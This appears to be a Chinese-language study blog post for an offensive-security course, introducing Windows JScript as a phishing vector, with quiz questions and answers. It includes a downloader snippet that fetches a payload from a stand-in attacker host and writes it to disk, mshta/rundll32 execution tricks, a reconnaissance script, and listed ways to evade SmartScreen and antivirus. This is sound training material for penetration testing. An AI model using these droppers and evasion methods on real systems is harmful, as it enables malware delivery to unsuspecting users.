---
title: OSEP-04-Jscript基础
description: '04-JScript攻击 | 01-Jscript基础'
pubDate: 2026-01-30T00:00:28+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Phishing
---

# Module 4: Windows Script Host 攻击

## 第一节：Jscript 基础

### 为什么学习 Jscript？

作为 Web 安全从业者，你对 JavaScript 应该非常熟悉。但你可能不知道，JavaScript 在 Windows 系统上有一个"兄弟"叫 **Jscript**，它可以脱离浏览器直接在系统上执行，这使它成为一个强大的攻击向量。

**与 Web JavaScript 的对比**：

| 特性 | 浏览器 JavaScript | Windows Jscript |
|------|------------------|-----------------|
| 执行环境 | 浏览器沙箱 | Windows Script Host |
| 安全限制 | 严格的沙箱限制 | **无沙箱限制** |
| 文件访问 | 不能访问本地文件 | 可以访问文件系统 |
| 系统调用 | 不能调用系统 API | 可以通过 ActiveX 调用 |
| 网络请求 | 受同源策略限制 | 无限制 |

---

## 一、Jscript 与 JavaScript 的关系

### 1.1 什么是 Jscript？

```
JavaScript 家族关系图：

ECMAScript (标准)
    │
    ├── JavaScript (浏览器实现)
    │   ├── Chrome V8
    │   ├── Firefox SpiderMonkey
    │   └── Safari JavaScriptCore
    │
    └── Jscript (微软实现)
        └── Windows Script Host (WSH)
            ├── cscript.exe (命令行)
            └── wscript.exe (图形界面)
```

**关键点**：
- Jscript 是微软对 ECMAScript 标准的实现
- 可以在 Windows Script Host 中执行
- **脱离浏览器沙箱**，可以直接与系统交互

### 1.2 为什么 Jscript 适合钓鱼攻击？

Windows 对不同脚本文件的默认处理方式：

| 文件扩展名 | 默认程序 | 双击行为 | 攻击适用性 |
|-----------|---------|---------|-----------|
| .ps1 | 记事本 | 打开编辑 | ❌ 不适合 |
| .bat | cmd.exe | 执行 | ⚠️ 可用但明显 |
| .vbs | WSH | 执行 | ✅ 适合 |
| **.js** | **WSH** | **执行** | **✅ 非常适合** |
| .hta | mshta.exe | 执行 | ✅ 适合 |

**重要发现**：`.js` 文件双击就会执行，而 `.ps1` 文件只会打开记事本！

---

## 二、Jscript 基础语法

### 2.1 Hello World

```javascript
// hello.js - 保存为 .js 文件，双击执行
WScript.Echo("Hello from Jscript!");
```

### 2.2 执行系统命令

```javascript
// 方法 1: 使用 WScript.Shell
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe");

// 方法 2: 隐藏窗口执行
// Run 的第二个参数控制窗口样式
// 0 = 隐藏窗口
// 1 = 正常窗口
// 2 = 最小化
shell.Run("cmd.exe /c whoami > C:\\temp\\output.txt", 0);
```

**Web 安全类比**：
- `ActiveXObject` 类似于 Node.js 中的 `require()`
- `WScript.Shell` 类似于 Node.js 中的 `child_process`

### 2.3 ActiveX 对象

ActiveX 是 Windows 的组件技术，Jscript 可以通过它访问系统功能：

```javascript
// 常用的 ActiveX 对象
var shell = new ActiveXObject("WScript.Shell");        // 执行命令
var fso = new ActiveXObject("Scripting.FileSystemObject");  // 文件操作
var http = new ActiveXObject("MSXML2.XMLHTTP");        // HTTP 请求
var stream = new ActiveXObject("ADODB.Stream");        // 二进制流
var wmi = new ActiveXObject("WbemScripting.SWbemLocator"); // WMI 查询
```

---

## 三、Jscript 文件操作

### 3.1 读取文件

```javascript
var fso = new ActiveXObject("Scripting.FileSystemObject");
var file = fso.OpenTextFile("C:\\Windows\\System32\\drivers\\etc\\hosts", 1);
var content = file.ReadAll();
file.Close();
WScript.Echo(content);
```

### 3.2 写入文件

```javascript
var fso = new ActiveXObject("Scripting.FileSystemObject");
var file = fso.CreateTextFile("C:\\temp\\test.txt", true);
file.WriteLine("Hello World");
file.Close();
```

### 3.3 检查文件/文件夹是否存在

```javascript
var fso = new ActiveXObject("Scripting.FileSystemObject");

if (fso.FileExists("C:\\Windows\\System32\\cmd.exe")) {
    WScript.Echo("cmd.exe exists");
}

if (fso.FolderExists("C:\\Windows")) {
    WScript.Echo("Windows folder exists");
}
```

---

## 四、Jscript 网络操作

### 4.1 HTTP GET 请求

```javascript
// 类似于 Web 中的 fetch() 或 XMLHttpRequest
var http = new ActiveXObject("MSXML2.XMLHTTP");

http.Open("GET", "http://example.com/data.txt", false);  // false = 同步
http.Send();

if (http.Status == 200) {
    WScript.Echo(http.ResponseText);
}
```

### 4.2 HTTP POST 请求

```javascript
var http = new ActiveXObject("MSXML2.XMLHTTP");

http.Open("POST", "http://example.com/api", false);
http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
http.Send("username=admin&password=123456");

WScript.Echo(http.ResponseText);
```

### 4.3 下载二进制文件

```javascript
var http = new ActiveXObject("MSXML2.XMLHTTP");
var stream = new ActiveXObject("ADODB.Stream");

// 下载文件
http.Open("GET", "http://attacker.com/payload.exe", false);
http.Send();

if (http.Status == 200) {
    // 保存为二进制文件
    stream.Open();
    stream.Type = 1;  // 1 = 二进制模式
    stream.Write(http.ResponseBody);
    stream.Position = 0;
    stream.SaveToFile("C:\\temp\\payload.exe", 2);  // 2 = 覆盖
    stream.Close();
}
```

---

## 五、Jscript 与 Web JavaScript 语法对比

### 5.1 相同的部分

```javascript
// 变量声明
var name = "test";
let count = 10;  // ES6，较新版本支持

// 函数定义
function add(a, b) {
    return a + b;
}

// 条件语句
if (condition) {
    // ...
} else {
    // ...
}

// 循环
for (var i = 0; i < 10; i++) {
    // ...
}

// 数组和对象
var arr = [1, 2, 3];
var obj = { name: "test", value: 123 };
```

### 5.2 不同的部分

```javascript
// Web JavaScript                    // Jscript (WSH)
// ================                  // ================

// 输出
console.log("Hello");               WScript.Echo("Hello");

// 创建对象
// 无法直接创建 COM 对象             var obj = new ActiveXObject("...");

// 文件操作
// 无法访问文件系统                   var fso = new ActiveXObject("Scripting.FileSystemObject");

// 执行命令
// 无法执行系统命令                   var shell = new ActiveXObject("WScript.Shell");
                                    shell.Run("cmd.exe");

// 网络请求
fetch("http://...")                 var http = new ActiveXObject("MSXML2.XMLHTTP");
// 或 XMLHttpRequest                 http.Open("GET", "http://...", false);
```

---

## 六、Jscript 执行方式

### 6.1 双击执行

最简单的方式，直接双击 `.js` 文件。

### 6.2 命令行执行

```cmd
:: 使用 cscript (命令行输出)
cscript script.js

:: 使用 wscript (图形界面输出)
wscript script.js

:: 指定引擎
cscript //E:jscript script.js
```

### 6.3 通过其他程序调用

```cmd
:: 通过 mshta 执行
mshta javascript:alert('Hello');close();

:: 通过 rundll32 执行 (需要特殊构造)
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";alert('test')
```

---

## 七、实战示例：信息收集脚本

```javascript
// recon.js - 收集系统信息
var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

// 获取环境变量
var username = shell.ExpandEnvironmentStrings("%USERNAME%");
var computername = shell.ExpandEnvironmentStrings("%COMPUTERNAME%");
var userprofile = shell.ExpandEnvironmentStrings("%USERPROFILE%");

// 收集信息
var info = "";
info += "Username: " + username + "\n";
info += "Computer: " + computername + "\n";
info += "Profile: " + userprofile + "\n";

// 获取 IP 地址 (通过执行命令)
var exec = shell.Exec("cmd /c ipconfig | findstr IPv4");
var ip = exec.StdOut.ReadAll();
info += "IP Info:\n" + ip;

// 输出结果
WScript.Echo(info);

// 或保存到文件
var file = fso.CreateTextFile("C:\\temp\\recon.txt", true);
file.Write(info);
file.Close();
```

---

## 八、安全机制与绕过

### 8.1 Windows Defender SmartScreen

当从网络下载的 `.js` 文件执行时，可能触发 SmartScreen 警告。

**绕过思路**：
- 使用 HTML Smuggling 在本地生成文件
- 将 `.js` 文件嵌入到其他文件格式中
- 使用代码签名（如果有证书）

### 8.2 脚本执行策略

与 PowerShell 不同，Jscript **没有执行策略限制**。

### 8.3 杀软检测

杀软可能检测：
- 已知的恶意 Jscript 签名
- 可疑的 ActiveX 对象调用
- 网络下载行为

**绕过思路**：
- 代码混淆
- 分段执行
- 使用 DotNetToJscript 加载 C# 代码

---

## 九、章节测试

### 选择题

1. Jscript 与浏览器 JavaScript 的主要区别是什么？
   - A) 语法不同
   - B) Jscript 没有沙箱限制
   - C) Jscript 只能在 IE 中运行
   - D) Jscript 不支持函数

2. 在 Windows 中，双击 `.js` 文件会发生什么？
   - A) 用记事本打开
   - B) 用浏览器打开
   - C) 由 Windows Script Host 执行
   - D) 显示错误

3. 以下哪个 ActiveX 对象用于执行系统命令？
   - A) MSXML2.XMLHTTP
   - B) ADODB.Stream
   - C) WScript.Shell
   - D) Scripting.FileSystemObject

4. `shell.Run("cmd.exe", 0)` 中的 `0` 表示什么？
   - A) 不等待命令完成
   - B) 隐藏窗口
   - C) 最大化窗口
   - D) 返回值

5. 下载二进制文件时，ADODB.Stream 的 Type 应设置为？
   - A) 0
   - B) 1 (二进制)
   - C) 2 (文本)
   - D) 3

### 实践题

1. 编写一个 Jscript 脚本，获取当前用户名并显示。

2. 编写一个 Jscript 脚本，检查 `C:\Windows\System32\cmd.exe` 是否存在。

### 答案

**选择题**：1-B, 2-C, 3-C, 4-B, 5-B

**实践题参考答案**：

1. 获取用户名：
```javascript
var shell = new ActiveXObject("WScript.Shell");
var username = shell.ExpandEnvironmentStrings("%USERNAME%");
WScript.Echo("Current user: " + username);
```

2. 检查文件存在：
```javascript
var fso = new ActiveXObject("Scripting.FileSystemObject");
if (fso.FileExists("C:\\Windows\\System32\\cmd.exe")) {
    WScript.Echo("cmd.exe exists!");
} else {
    WScript.Echo("cmd.exe not found!");
}
```

---

**下一节**：[03-Jscript-Dropper.md](/blog/osep/04-jscript攻击/03-jscript-dropper/) - 创建 Jscript Dropper
